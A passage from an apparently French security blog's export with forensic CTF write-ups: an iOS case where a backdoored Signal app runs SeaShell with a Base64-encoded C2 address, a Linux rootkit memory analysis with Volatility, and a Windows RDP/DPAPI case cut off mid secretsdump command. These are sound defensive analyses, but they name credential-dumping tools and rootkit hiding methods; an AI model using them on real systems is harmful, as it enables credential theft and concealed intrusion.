qu\u0026rsquo;on verra par la suite) ou toute URL codée (Base64 ou autre) est immédiatement visible et peut être décodé/inspecté.\nTracking temporel et contexte Avec la date/heure (started, datetime) et les champs de performance (%cpu, %mem), on sait si un processus a démarré anormalement tôt (au boot) ou s\u0026rsquo;il consomme des ressources pour exfiltrer des données, même si ça reste à 0 % pour masquer son activité.\nCorroboration avec d\u0026rsquo;autres modules de sysdiagnose Le ps.txt s\u0026rsquo;intègre à l\u0026rsquo;ensemble des autres dumps (réseau, fichiers ouverts, configurations). On peut croiser : \u0026ldquo;X processus root vers IP Y\u0026rdquo; + \u0026ldquo;connexion réseau vers Y\u0026rdquo; + \u0026ldquo;fichiers créés dans Z\u0026rdquo; pour construire un fil d\u0026rsquo;attaque.\nOn voit donc ceci :\nroot … 279 1 … /var/containers/Bundle/Application/…/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== root … 330 1 … /var/containers/Bundle/Application/…/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== root … 345 344 … /var/containers/Bundle/Application/…/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== 1. Binaire \u0026ldquo;mussel\u0026rdquo; – Un fichier mussel embarqué dans l\u0026rsquo;app Signal est inhabituel : ce n\u0026rsquo;est pas un démon standard d\u0026rsquo;iOS.\n2. Exécution en root – Il tourne avec l\u0026rsquo;UID 0 (root), ce qui est extrêmement suspect pour un composant d\u0026rsquo;application tierce.\n3. Argument codé en Base64 – dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== est une chaîne Base64 qui, décodée, donne tcp://98.66.154.235:29552, un canal TCP vers une IP externe, sans doute un C2.\n4. Comportement typique d\u0026rsquo;un spyware – Un démon inconnu qui s\u0026rsquo;exécute en root et ouvre une connexion vers un hôte externe ressemble fortement à un implant malveillant ou spyware.\nAnswer : FCSC{org.whispersystems.signal|345}\n⭐⭐ - iForensics - iBackdoor 2/2 #\rMaintenant que vous savez quelle application a été compromise, retrouvez comment est-ce que l\u0026rsquo;attaquant a récupéré l\u0026rsquo;application légitime, préalablement à l\u0026rsquo;infection. Il vous faudra retrouver :\nL\u0026rsquo;identifiant de l\u0026rsquo;application utilisée pour récupérer l\u0026rsquo;application légitime; Le chemin utilisé pour stocker l\u0026rsquo;application légitime; La date de désinstallation de l\u0026rsquo;application légitime (en heure locale). Le flag est au format FCSC{||}. Par exemple, si l\u0026rsquo;application utilisée est Example (com.example), que le chemin est /private/var/tmp/test.xyz et que la date de désinstallation est 2025-01-01 01:00:00 : FCSC{com.example|/private/var/tmp/test.xyz|2025-01-01 01:00:00}.\nRemettons les choses à plat :\non sait que c\u0026rsquo;est Signal l\u0026rsquo;app en question on sait qu\u0026rsquo;elle a été lancé vers 7:47AM on doit trouver le chemin de l\u0026rsquo;app, ce qui a \u0026ldquo;récupéré\u0026rdquo; / installé l\u0026rsquo;app légitime et la date de désinstallation Pour cela je me suis directement dirigé vers les mobileinstallation.\nEn effet, c\u0026rsquo;est la couche d\u0026rsquo;iOS responsable de l\u0026rsquo;installation, la mise à jour et désinstallation des apps.\nOn pourra y retrouver :\nles timestamps précis (timestamp + datetime) les bundle id les détails du process d\u0026rsquo;uninstall les erreurs et leur contexte Bingo : // à 07:40:47-07:00, première désinstallation de Signal { \u0026#34;datetime\u0026#34;: \u0026#34;2025-04-07T07:40:47.000000-07:00\u0026#34;, \u0026#34;event_type\u0026#34;: \u0026#34;MIClientConnection _uninstallIdentities\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Uninstall requested by installcoordinationd ... for identity [org.whispersystems.signal]\u0026#34; } // à la même seconde, on détruit ses containers : \u0026#34;message\u0026#34;: \u0026#34;Destroying container org.whispersystems.signal ... at /private/var/containers/Bundle/Application/1EC20F02-...\u0026#34; // à 07:43:55, désinstallation de l\u0026#39;outil com.fiore.trolldecrypt { \u0026#34;datetime\u0026#34;: \u0026#34;2025-04-07T07:43:55.000000-07:00\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Uninstalling identifier com.fiore.trolldecrypt\u0026#34; // puis destruction du bundle container correspondant } On sait donc maintenant que l\u0026rsquo;attaquant a utilisé TrollDecrypt qui est utilitaire opensource destiné aux appareils iOS équipés de TrollStore. Il permet de déchiffrer à la volée les applications installées (IPA protégées par FairPlay DRM) directement sur l\u0026rsquo;appareil, sans nécessiter de jailbreak. Concrètement, il :\nscanne la liste des apps installées sur l\u0026rsquo;iDevice via TrollStore déchiffre le binaire FairPlay de l\u0026rsquo;application ciblée emballe le résultat dans un fichier .ipa exploitable (pour analyses, réinstallations, sideloading, etc.) TrollStore exploite une faille CoreTrust pour signer à vie n\u0026rsquo;importe quelle IPA. TrollDecrypt s\u0026rsquo;appuie dessus pour lancer l\u0026rsquo;app ciblée, dumper sa mémoire et sortir un IPA FairPlay free. D\u0026rsquo;où la présence du dossier /Library/TrollDecrypt/decrypted/.\nJ\u0026rsquo;avoue qu\u0026rsquo;il y aurait mille façons intelligentes de pivoter, analyser et trouver le path de stockage de l\u0026rsquo;app légitime mais il y a plus rapide. Dans un contexte de CTF ça compte.\nChercher un .ipa tout simplement.\nCe qui donne pour une timeline très succincte :\n07h40m47s : désinstallation de Signal (log MI) 07h40–42m : dump → Signal_7.53_decrypted.ipa (fslisting) 07h43m55s : désinstallation de TrollDecrypt (log MI) 07h47mxxs : lancement de l\u0026rsquo;IPA repackée (unified log) On a désormais tout pour créer le flag.\nFlag : FCSC{com.fiore.trolldecrypt|/private/var/mobile/Library/TrollDecrypt/decrypted/Signal_7.53_decrypted.ipa|2025-04-07 07:40:47}\n⭐⭐⭐ - iForensics - iC2 #\rRetrouvez le nom de l\u0026rsquo;outil malveillant déployé sur le téléphone, ainsi que le protocole, l\u0026rsquo;adresse IP et le port de communication vers le serveur C2.\nLe flag est au format FCSC{|||}. Par exemple, si l\u0026rsquo;outil est Cobalt Strike, le protocole TCP, l\u0026rsquo;adresse IP 127.0.0.1 et le port 1337 : FCSC{Cobalt Strike|TCP|127.0.0.1|1337}.\nJe me suis donc renseigné davantage sur TrollStore et les actualités intéressantes liées. Je suis tombé sur cette article : https://idevicecentral.com/news/ios-malware-makes-trollstore-users-vulnerable-to-monitoring-file-extraction-remote-control-on-ios-14-ios-17/\nOn a déjà récupéré le protocol, l\u0026rsquo;IP et le port plus tôt donc c\u0026rsquo;est simple :\nFlag : FCSC{SeaShell|TCP|98.66.154.235|29552}\n","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/posts/fcsc/","section":"Posts","summary":"Scénario #\rLors d\u0026rsquo;un passage de douane, le douanier vous demande de lui remettre votre téléphone ainsi que son code de déverrouillage.","title":"FCSC 2025 - iOS Forensic","type":"posts"},{"content":"","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/tags/ios/","section":"Tags","summary":"","title":"IOS","type":"tags"},{"content":"\rScénario #\rÀ l\u0026rsquo;issue du processus de récupération du serveur, l\u0026rsquo;équipe IR a mis en évidence un réseau complexe de trafic persistant, de communications furtives et de processus tenaces ayant résisté à nos tentatives d\u0026rsquo;arrêt. Il est évident que la portée de l\u0026rsquo;incident dépasse la violation initiale de nos serveurs et de nos clients. En tant qu\u0026rsquo;expert en forensic, pouvez-vous éclairer les ombres qui cachent ces activités clandestines ?\nSetup #\rPour ce Sherlock nous allons utiliser :\nVolatility2 IDA Nous allons également nous appuyer sur cette cheatsheet :\nhttps://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf Profil volatility #\rPremièrement on doit installer python2, volatility2 et ajouter le profil nécessaire.\nUn profil Volatility est un fichier contenant des informations structurelles sur le système d\u0026rsquo;exploitation cible. Pour simplifier, c\u0026rsquo;est comme une \u0026ldquo;carte\u0026rdquo; qui permet à Volatility de comprendre comment les données sont organisées dans la mémoire d\u0026rsquo;un système spécifique.\nCe profil contient principalement deux types d\u0026rsquo;informations :\nles définitions des structures de données du kernel les symboles du kernel (adresses des fonctions et variables) Installation :\nsudo apt install -y python2 python2-dev build-essential libdistorm3-dev libssl-dev libffi-dev zlib1g-dev curl -sS https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python2 get-pip.py sudo python2 -m pip install --upgrade pip setuptools wheel sudo python2 -m pip install distorm3 pycrypto openpyxl pillow yara-python git clone https://github.com/volatilityfoundation/volatility.git cd volatility python2 vol.py -h Profil :\ncp Ubuntu_5.3.0-70-generic_profile.zip /home/kali/Documents/volatility/volatility/plugins/overlays/linux/ python2 vol.py --info | grep Linux Question 1 #\rQuels sont les IP et le port utilisés par l\u0026rsquo;attaquant pour le reverse shell ?\nPour cela on va utiliser le module linux_netstat de volatility qui permet d\u0026rsquo;extraire et afficher toutes les connexions réseaux qui étaient présentes lors de la capture mémoire. On va rediriger l\u0026rsquo;output dans un fichier pour faciliter la recherche via un éditeur de texte / IDE etc.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_netstat \u0026gt; netstat.txt Sous Linux, le plus probable est de retrouver un reverse shell bash particulièrement basique, et effectivement :\nRéponse : 10.0.2.6:443\nQuestion 2 #\rQuel était le PPID de la connexion malveillante du reverse shell ?\nTout d\u0026rsquo;abord, testons avec ``linux_pstree` :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_pstree | grep -C 5 3633 Pas de PPID. Pourquoi ? Le plugin linux_pstree reconstruit l\u0026rsquo;arborescence des processus en se basant principalement sur une seule source d\u0026rsquo;information : la liste des tâches actives du système (task_struct).\nhttps://makelinux.github.io/kernel/map/\nOn va donc plutôt utiliser le plugin linux_psxview qui est conçu spécifiquement pour détecter les processus cachés. Il utilise plusieurs sources pour idenfifier les processus :\ntask_struct list : la même liste de tâches utilisée par linux_pstree pid hash table : une structure de hachage utilisée par le kernel pour rechercher rapidement les processus par PID pslist : liste des processus extraite d\u0026rsquo;autres sources mémoire kmem_cache : cache du kernel qui peut contenir des références aux processus d_path : informations sur les processus tirées du système de fichiers procfs thread_info : informations des threads qui peuvent révéler des processus cachés Il compare ensuite les résultats de ces différentes sources et signale les incohérences, par exemple lorsqu\u0026rsquo;un processus apparaît dans une source mais pas dans une autre.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_psxview \u0026gt; psxview.txt Et logiquement, on se doute bien que le parent est le PID juste avant.\nMais pourquoi le cacher ? Au vu du scénario, on sait que l\u0026rsquo;on a à faire à un rootkit. Ce qui s\u0026rsquo;est probablement passé c\u0026rsquo;est que le rootkit a modifié la liste des tâches (task_struct list) en \u0026ldquo;déconnectant\u0026rdquo; son processus de reverse shell de cette liste chaînée. Concrètement, il a manipulé les pointeurs next et prev de cette liste pour que son processus soit ignoré lors du parcours de la liste.\nCependant, le rootkit n\u0026rsquo;a pas réussi à effacer toutes les traces de son existence. Il a omis de modifier une ou plusieurs des autres structures surveillées par linux_psxview.\nLe résultat est que linux_pstree, qui ne se fie qu\u0026rsquo;à la liste des tâches, ne voit pas le processus malveillant, tandis que linux_psxview, qui vérifie plusieurs sources, le détecte via les structures que le rootkit a négligé de modifier.\nRéponse : 3632\nQuestion 3 #\rIndiquer le nom du module malveillant du kernel.\nPour cela on va utiliser le plugin linux_check_modules. Mais avant, remettons en contexte qu\u0026rsquo;est-ce qu\u0026rsquo;un module kernel et quel est le lien avec un rootkit.\nUn module kernel c\u0026rsquo;est un morceau de code qui peut être chargé et déchargé dynamiquement dans le kernel d\u0026rsquo;un système d\u0026rsquo;exploitation en cours d\u0026rsquo;exécution. Cela permet d\u0026rsquo;étendre ses fonctionnalités (comme la prise en charge de nouveaux périphériques ou systèmes de fichiers) sans devoir redémarrer ou recompiler complètement le kernel.\nLes rootkits opèrent au niveau du kernel Linux en insérant leurs propres modules kernel (LKM - Loadable Kernel Modules). Ces modules malveillants peuvent:\nintercepter les appels système pour dissimuler des fichiers, processus ou connexions établir des backdoors persistantes dans le système désactiver certaines fonctionnalités de sécurité du kernel masquer leur propre présence aux outils standard du système etc. Concernant le plugin volatility linux_check_modules. Il est conçu pour détecter les LKM caché en comparant encore une fois différente sources d\u0026rsquo;information du kernel.\n1. Analyse de la liste officielle des modules\nTout d\u0026rsquo;abord, le plugin examine la liste des modules officiellement chargés (modules.list). Cette liste circulairement chaînée est maintenue par le kernel et contient tous les modules légitimement chargés. Elle est accessible via la commande lsmod.\n2. Analyse des symboles du kernel\nEnsuite, il parcourt la table des symboles du kernel (accessible via /proc/kallsyms). Cette table contient les adresses de toutes les fonctions et variables du kernel, y compris celles introduites par des modules chargés.\n3. Analyse de la section modulaire .ko\nLe plugin examine également les sections mémoire où les modules kernel (.ko) sont typiquement chargés, recherchant les signatures caractéristiques des modules même s\u0026rsquo;ils ne sont pas référencés ailleurs.\n4. Techniques de détection des modules cachés\nla technique principale consiste à comparer les modules trouvés dans la liste officielle avec ceux détectés par l\u0026rsquo;analyse des symboles ou des sections mémoire. Un module présent dans une source mais absent de la liste officielle est probablement caché intentionnellement. le plugin examine également la table des appels système (syscall table) pour détecter si des fonctions originales ont été remplacées par des versions modifiées - une technique courante des rootkits pour intercepter les interactions avec le kernel. il vérifie si les adresses des fonctions de modules pointent vers des régions mémoire suspectes ou non standard, ce qui pourrait indiquer du code injecté. les attributs des modules sont analysés (comme l\u0026rsquo;horodatage, le nom, l\u0026rsquo;auteur) pour détecter des informations incohérentes ou inhabituelles. Ok c\u0026rsquo;est cool mais comment les rootkit se cache au fait ?\nIl y a beaucoup de technique différente mais on retrouve généralement :\nDKOM (Direct Kernel Object Manipulation) : Ils modifient les structures de données du kernel en mémoire pour retirer leur module de la liste modules.list, tout en laissant le module fonctionnel.\nHooks de syscall : Ils remplacent les fonctions légitimes du kernel par leurs propres versions qui filtrent les résultats (par exemple, une version modifiée de read qui ne montre jamais certains fichiers).\nModule sans nom : Certains modules malveillants utilisent des chaînes vides ou des caractères spéciaux comme nom pour compliquer leur détection.\nEnfin bref, revenons à la question.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_check_modules Le nom \u0026ldquo;nfentlink\u0026rdquo; est une tentative de camouflage d\u0026rsquo;un module malveillant en se faisant passer pour \u0026ldquo;nfnetlink\u0026rdquo;, qui est un module kernel légitime de Linux utilisé pour la communication entre l\u0026rsquo;espace kernel et l\u0026rsquo;espace utilisateur pour le firewall et le réseau.\nRéponse : nfentlink\nQuestion 4 #\rQuand est-ce que le module a été chargé ?\nAu départ, j\u0026rsquo;étais parti sur une mauvaise piste. Ma pensée était :\nprendre le timestamp du chargement du module dans dmesg via linux_dmesg prendre le timestamp du boot dans linux_pslist calculer et hop Cela aurait fonctionné si c\u0026rsquo;était la première fois que le module était chargé. Néanmoins, il a déjà été chargé dans le passé. Cette méthode est intrinsèquement mauvaise et peut induire en erreur dans un contexte de réponse à incident.\nAu final j\u0026rsquo;ai remis tout à plat et je me suis dit \u0026ldquo;où puis-je trouver des timestamp lié à des actions passées après de multiple boot ?\u0026rdquo;.\nLes logs systèmes évidemment. Tout particulièrement /var/log/kern.log ou /var/log/syslog.log.\nPour récupérer ces fichiers on va premièrement énumérer les fichiers dans la capture mémoire :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_enumerate_files \u0026gt; files.txt Et en effet on retrouve bien : Ensuite, pour extraire /var/log/kern.log on va :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea5a732fa8 -O kern.log Réponse : 2024-05-01 20:42:57\nQuestion 5 #\rQuel est le chemin d\u0026rsquo;accès complet et le nom du fichier du module du kernel malveillant ?\nDe même, vérifions parmi les fichiers énumérés. Premièrement on cherche le module qu\u0026rsquo;on a identifié \u0026ldquo;nfentlink\u0026rdquo;.\ncat files.txt |grep nfentlink ça ne donne rien d\u0026rsquo;intéressant.\nOn va donc chercher le module qui a le vrai nom pour voir :\nOn va revenir sur le deuxième fichier plus tard.\nRéponse : /lib/modules/5.3.0-70-generic/kernel/drivers/net/nfnetlink.ko\nQuestion 6 #\rQuel est le hash MD5 du fichier du module malveillant ?\nIl suffit d\u0026rsquo;extraire le fichier et calculer son hash :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea266b5a68 -O nfnetlink.ko md5sum nfnetlink.ko Réponse : 35bd8e64b021b862a0e650b13e0a57f7\nQuestion 7 #\rQuel est le chemin d\u0026rsquo;accès complet et le nom du fichier du module du kernel légitime ?\nRevenons au screen de la question 5.\nRéponse : /lib/modules/5.3.0-70-generic/kernel/net/netfilter/nfnetlink.ko\nQuestion 8 #\rQuelle est la différence d\u0026rsquo;un seul caractère dans la valeur de l\u0026rsquo;auteur entre le module légitime et le module malveillant ?\nPremièrement on va checker le légitime via modinfo qui permet d\u0026rsquo;afficher des informations détaillés sur un module kernel spécifique.\nmodinfo /lib/modules/6.11.2-amd64/kernel/net/netfilter/nfnetlink.ko.xz Ensuite, on check le module kernel qu\u0026rsquo;on a récupéré dans la capture :\nmodinfo malicious-nfnetlink.ko On voit donc bien qu\u0026rsquo;il manque un \u0026ldquo;i\u0026rdquo;.\nRéponse : i\nQuestion 9 #\rQuel est le nom de la fonction d\u0026rsquo;initialisation du module du kernel malveillant ?\nPour répondre à cette question je vais utiliser IDA. C\u0026rsquo;est vraiment overkill, on peut se limiter à gdb (gef\u0026gt;gdb), radare2 etc.\nOn va donc regarder les fonctions : On voit bien que la fonction d\u0026rsquo;initialisation est nfnetlink_init mais aussi init_module. C\u0026rsquo;est encore plus visible avec gef :\nGef affiche les deux fonctions à la même adresse mémoire. On observe donc une technique délibérée de camouflage utilisée par des rootkits au niveau kernel.\nLe module malveillant utilise la fonction standard init_module (qui est l\u0026rsquo;entrée obligatoire pour tout module kernel Linux) mais a intentionnellement renommé cette fonction en nfnetlink_init pour ressembler au module légitime du kernel.\nLes symboles d\u0026rsquo;exportation comme init_module sont essentiels pour que le kernel Linux puisse charger le module, mais l\u0026rsquo;attaquant a utilisé des astuces de compilation pour que la même fonction porte deux noms différents, l\u0026rsquo;un pour le chargement par le kernel et l\u0026rsquo;autre pour le camouflage visuel.\nRéponse : nfnetlink_init\nQuestion 10 #\rIl existe une fonction pour hooker les syscall. Quel est le dernier syscall du tableau ?\nDans la fonction nfnetlink_init on voit bien _sys_call_table = kallsyms_lookup_name(\u0026quot;sys_call_table\u0026quot;); :\n_sys_call_table = kallsyms_lookup_name(\u0026#34;sys_call_table\u0026#34;); Cette ligne utilise la fonction kallsym_lookup_name pour obtenir l\u0026rsquo;adresse de la table des syscall sys_call_table dans la mémoire du kernel.\nsys_call_table est un tableau contenant les pointeurs vers les fonctions des syscall utilisés par le kernel. En modifiant cette table, l\u0026rsquo;attaquant redirige les appels système vers ses propres routines malveillantes.\nOn va donc aller voir le tableau de données dans la section .rodata (section contenant des chaînes de caractères et des données en lecture seule).\nCe tableau contient des références à des symboles qui sont utilisées pour diverses manipulations dans le module malicieux.\naX64SysGetdents db \u0026#39;_x64_sys_getdents64\u0026#39;,0 aX64SysGetdents db \u0026#39;_x64_sys_getdents\u0026#39;,0 aX64SysKill db \u0026#39;_x64_sys_kill\u0026#39;,0 Ces chaînes sont des références aux symboles des fonctions système que le module va utiliser ou modifier.\nCes fonctions font partie de l\u0026rsquo;API des syscall du kernel Linux, et dans ce cas, elles sont hookées ou utilisées pour rediriger des appels.\nRéponse : __x64_sys_kill\nQuestion 11 #\rQuel numéro de signal est utilisé pour masquer le PID d\u0026rsquo;un processus en cours d\u0026rsquo;exécution lors de l\u0026rsquo;envoi ?\nOn va donc aller voir la fonction hook_kill :\nCe qui retient immédiatement notre attention est :\ncmp dword ptr [rdi+68h], 64 ainsi que le hide_pid.\nAllons voir le pseudocode généré par IDA :\nif ( (*(DWORD *)(a1 + 104)) != 64 ) return ((__int64 (*) (void))orig_kill()); a1 + 104 : cela accède au signal envoyé avec l\u0026rsquo;appel kill(). Le champ à l\u0026rsquo;adresse a1 + 104 correspond donc au signal.\n(*(DWORD *)(a1 + 104)) != 64 : cette condition vérifie si le signal n\u0026rsquo;est pas égal à 64.\nSi le signal n\u0026rsquo;est pas égal à 64, la fonction exécute la fonction orig_kill (l\u0026rsquo;originale, avant le hook) pour continuer l\u0026rsquo;exécution normale du kernel.\nSinon il fait appel à hide_pid :\nsprintf(hide_pid, \u0026#34;%d\u0026#34;, *((QWORD *)(a1 + 112))); sprintf(hide_pid, \u0026quot;%d\u0026quot;, ...) : la fonction sprintf est utilisée ici pour formater et passer le PID dans la fonction hide_pid. On comprend donc que ce PID est utilisé par la fonction hide_pid afin de dissimuler le processus au niveau du système, par exemple en supprimant ses entrées dans /proc ou dans d\u0026rsquo;autres structures internes du kernel.\nhide_pid : est la fonction pour cacher un processus, empêchant ainsi sa visibilité.\n%d : C\u0026rsquo;est un format pour afficher l\u0026rsquo;entier (le PID).\nRéponse : 64\nLab terminé !\n","date":"20 avril 2025","externalUrl":null,"permalink":"/blog-cyber/posts/aptnightmare2/","section":"Posts","summary":"Scénario #\rÀ l\u0026rsquo;issue du processus de récupération du serveur, l\u0026rsquo;équipe IR a mis en évidence un réseau complexe de trafic persistant, de communications furtives et de processus tenaces ayant résisté à nos tentatives d\u0026rsquo;arrêt.","title":"APTNightmare-2","type":"posts"},{"content":"","date":"20 avril 2025","externalUrl":null,"permalink":"/blog-cyber/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"\rScénario #\rLe 28 juin, notre client a détecté des sessions RDP non autorisées, sans déploiement de PAM, dans leur environnement. Ils ont récupéré des preuves sur un serveur qu’ils suspectaient de servir de pivot pour un mouvement latéral vers d’autres cibles. Même si l’attaquant a supprimé les events log, je pense que les quelques artefacts restants suffisent à confirmer le déroulement de l’attaque et à retracer le comportement de l’assaillant.\nSetup #\rPour ce Sherlock nous allons utiliser :\nZimmerman Tools (EvtxECmd, Registry Explorer, Timeline Explorer, PECmd, WxTCmd\u0026hellip;) Impacket (secretsdump.py) NirSoft DataProtectionDecryptor ANSSI BMC-tools BSI-Bund RdpCacheStitcher On va aussi s\u0026rsquo;appuyer sur des cheatsheets tels que celle de la FOR500 de SANS et celle portant sur les registres windows de 13Cubed :\nhttps://13cubed.s3.amazonaws.com/downloads/windows_registry_cheat_sheet.pdf\nQuestion 1 #\rQuand a eu lieu la dernière tentative de connexion échouée utilisant l\u0026rsquo;utilisateur emman.t ? (UTC)\nPremièrement on va vérifier si, comme le scénario l\u0026rsquo;explique, les events logs ont bien été effacés. Pour cela, nous allons utiliser les tools de Zimmerman EvtxECmd et Timeline Explorer afin de répondre à cette question.\nEvtxECmd.exe -d \u0026#34;C:/C___NONAME [NTFS]\\[root]\\Windows\\System32\\winevt\\Logs\u0026#34; --csv \u0026#34;C:\\Users\\username\\Desktop\\HTB\\latus\u0026#34; On recherche l\u0026rsquo;ID 4625 (Account failed to log on), mais RAS.\nEt effectivement on voit bien que les logs ont été effacés :\nIl nous reste cependant une chance de les retrouver si on dispose de VSS (Volume Shadow Copy).\nLe (VSS) est une fonctionnalité Windows qui crée des snapshots de l’état d’un disque à un moment donné. Si des VSS sont disponibles, on peut retrouver des versions antérieures de fichiers supprimés ou altérés, y compris les events log. Donc, même si un attaquant a effacé les logs sur la machine en live, il est parfois possible de récupérer ceux qui existaient au moment où le snapshot VSS a été créé.\nMalheureusement, après vérification, on n\u0026rsquo;a pas de VSS. On est donc obligé de se rediriger sur les Registry.\nPour ça nous allons utiliser un autre outil de Zimmerman, Registry Explorer.\nOn va aller voir du côté de la registry hive SAM. En effet, on pourra y retrouver des artéfacts dans SAM\\Domains\\Account\\Users tels que :\nlast login time last incorrect password last password change login counts group membership account creation time etc. Pour cela, on va charger le fichier C___NONAME [NTFS]\\[root]\\Windows\\System32\\config\\SAM dans Registry Explorer :\nEt effectivement on retrouve le \u0026ldquo;Last Incorrect Password\u0026rdquo;\nRéponse : 2024-06-26 07:24:35\nQuestion 2 #\rQuelles sont les 3 premières adresses IP auxquelles emman.t s\u0026rsquo;est connecté via Remote Desktop (RDP) ?\nPour répondre à cette question on va aller regarder du côté du NTUSER.dat. C\u0026rsquo;est la registry hive située dans le dossier de profil de l\u0026rsquo;utilisateur, il contient toutes les configurations personnelles et le préférences de l\u0026rsquo;environnement de bureau.\nLorsqu\u0026rsquo;un utilisateur se connecte, ce fichier est chargé pour appliquer ses paramètres spécifiques (les paramètres d\u0026rsquo;application, l\u0026rsquo;historique des activités, etc.).\nOn va particulièrement porter notre attention sur HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client car c\u0026rsquo;est ici que sont stockés les paramètres RDP et la liste des serveurs auxquels l\u0026rsquo;utilisateur s\u0026rsquo;est connecté via RDP.\nOn charge donc le fichier NTUSER.dat de l\u0026rsquo;utilisateur en question dans Registry Explorer et on se rend au chemin voulu :\nRéponse : 192.168.86.250,192.168.25.128,192.168.25.131\nQuestion 3 #\rQuel est le nom d\u0026rsquo;utilisateur de destination utilisé pour se connecter en Remote Desktop pour la première fois le 2024-06-20 à 16:01:05 UTC ?\nOn a déjà la réponse sur le screen de la question 2.\nRéponse : tommyxiaomi\nQuestion 4 #\rQuelle est l\u0026rsquo;adresse IP de destination de la dernière session Remote Desktop (RDP) ?\nIdem.\nRéponse : 192.168.70.133\nQuestion 5 #\remman.t est très négligent en sauvegardant systématiquement ses identifiants RDP pour se connecter à d\u0026rsquo;autres hôtes, ce qui laisse penser que l\u0026rsquo;attaquant les a, d\u0026rsquo;une manière ou d\u0026rsquo;une autre, divulgués. Pouvez-vous confirmer les identifiants divulgués du serveur avec l\u0026rsquo;IP 192.168.70.133 ?\nCette question est un petit défi très intéressant.\nPremièrement, allons droit au but, où pouvons-nous trouver les credentials RDP ? Lorsqu\u0026rsquo;on se connecte en RDP via l\u0026rsquo;application de Microsoft par défaut, l\u0026rsquo;app nous propose de sauvegarder les credentials :\nPour stocker ces credentials, Windows utilise le système de Credential Manager pour gérer et stocker de manière \u0026ldquo;sécurisée\u0026rdquo;. Lorsque l’utilisateur sauvegarde ses identifiants lors d’une connexion RDP, ces credentials sont enregistrés dans le dossier spécifique de l’utilisateur, ici situé à C:\\Users\\emman.t\\AppData\\Local\\Microsoft\\Credentials.\nCredential Manager s\u0026rsquo;appuie sur la DPAPI (Data Protection API) afin de chiffrer les informations d\u0026rsquo;authentifications. L\u0026rsquo;API est très straightforward :\nDPAPI_IMP BOOL CryptProtectData( [in] DATA_BLOB *pDataIn, [in, optional] LPCWSTR szDataDescr, [in, optional] DATA_BLOB *pOptionalEntropy, [in] PVOID pvReserved, [in, optional] CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, [in] DWORD dwFlags, [out] DATA_BLOB *pDataOut ); Cette API est largement utilisée par Microsoft et d\u0026rsquo;autres applications telles que Chrome, Edge etc. afin de stocker des mots de passe et autres secrets en tout genre.\nDPAPI fonctionne en utilisant des clés appelées masterkeys. Ces masterkeys servent à chiffrer les données protégées par DPAPI. Chaque masterkey est elle-même chiffrée à l\u0026rsquo;aide d\u0026rsquo;un dérivé du mot de passe de l\u0026rsquo;utilisateur ou de la clé système DPAPI.\nCes masterkeys sont stockées dans :\nPour l\u0026rsquo;utilisateur : C:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Roaming\\Microsoft\\Protect\\\u0026lt;SID\u0026gt; Pour le système : C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18 Ces masterkeys :\nsont renouvelés automatiquement tous les 3 mois ou après un changement de mot de passe utilisateur. mise en cache (stockage temporaire en clair) dans le processus LSASS (très utile memory forensic ou alors en pentest) Voici comment fonctionne le mécanisme DPAPI :\nAu centre, on retrouve la masterkey qui est la clé principale utilisée par DPAPI pour chiffrer et déchiffrer des secrets.\nCette Masterkey est elle-même chiffrée et protégée. Selon la situation, elle peut être déchiffrée à partir de différentes clés : - Le NT hash du mot de passe utilisateur d\u0026rsquo;un compte de domaine. - Le hash SHA1 du mot de passe d’un compte utilisateur local. - Une clé machine nommée Domain Backup Key, spécifique aux environnements Active Directory, permettant de déchiffrer les masterkeys sans avoir le mot de passe utilisateur, si l’on possède les droits suffisants.\nUne fois la Masterkey déchiffrée grâce à l\u0026rsquo;une de ces clés, elle permet de dériver une clé de session (Session Key), qui est directement utilisée pour chiffrer ou déchiffrer les données protégées par DPAPI.\nPour déchiffrer des données protégées par DPAPI on peut s\u0026rsquo;aider de pas mal de tool :\nutilisable sur un live system : LaZagne pypykatz - dpapi module mimikatz SharpDPAPI offline après avoir récupéré les fichiers nécessaires : pypykatz - dpapi module dpapi.py - impacket mimikatz SharpDPAPI dpapilab-ng diana Si vous souhaitez rentrer davantage dans les détails de la DPAPI, je vous invite à lire cette publication de Synacktiv (l\u0026rsquo;explication ci-dessus est basé sur le post): https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary\nMaintenant qu\u0026rsquo;on sait tout ça, comment peut-on l\u0026rsquo;appliquer à notre situation ? Ici j\u0026rsquo;ai souhaité partir sur :\nImpacket (secretsdump.py) NirSoft DataProtectionDecryptor Le script secretsdump.py va nous permettre de récupérer le mot de passe de l\u0026rsquo;utilisateur en question afin de pouvoir déchiffrer les secrets DPAPI :\nsecretsdump.py -sam \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SAM\u0026#34; --security \u0026#34;C:\\C___NONAME 